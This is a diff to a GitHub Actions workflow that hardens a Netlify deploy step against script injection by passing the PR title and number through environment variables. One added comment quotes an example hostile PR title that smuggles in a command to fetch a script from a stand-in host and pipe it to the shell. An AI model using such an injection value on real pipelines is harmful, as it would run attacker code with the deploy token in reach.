@@ -138,16 +138,21 @@ jobs:
       - name: Deploy to Netlify
         id: deploy
         if: success() && (github.ref == 'refs/heads/main' || github.event_name == 'pull_request')
+        # Event data reaches the script as env vars, never as inline ${{ }}. Those are pasted in as
+        # text before bash sees the script, so a PR titled `"; curl evil.sh | sh; #` would otherwise
+        # run on the runner with the deploy token in scope.
         run: |
-          if [ "${{ github.ref }}" = "refs/heads/main" ]; then
-            netlify deploy --prod --no-build --dir=build --message="Production deploy @ ${{ github.sha }}"
+          if [ "$GITHUB_REF" = "refs/heads/main" ]; then
+            netlify deploy --prod --no-build --dir=build --message="Production deploy @ $GITHUB_SHA"
           else
-            DEPLOY_URL=$(netlify deploy --no-build --dir=build --alias=pr-${{ github.event.number }} --json --message="Deploy preview #${{ github.event.number }} ${{ github.event.pull_request.title }} @ ${{ github.sha }}" | jq -r '.deploy_url')
-            echo "deploy_url=$DEPLOY_URL" >> $GITHUB_OUTPUT
+            DEPLOY_URL=$(netlify deploy --no-build --dir=build --alias="pr-$PR_NUMBER" --json --message="Deploy preview #$PR_NUMBER $PR_TITLE @ $GITHUB_SHA" | jq -r '.deploy_url')
+            echo "deploy_url=$DEPLOY_URL" >> "$GITHUB_OUTPUT"
           fi
         env:
           NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
           NETLIFY_SITE_ID: ${{ secrets.NETLIFY_SITE_ID }}
+          PR_NUMBER: ${{ github.event.number }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
 
       - name: Add comment
         if: github.event_name == 'pull_request' && steps.deploy.outputs.deploy_url
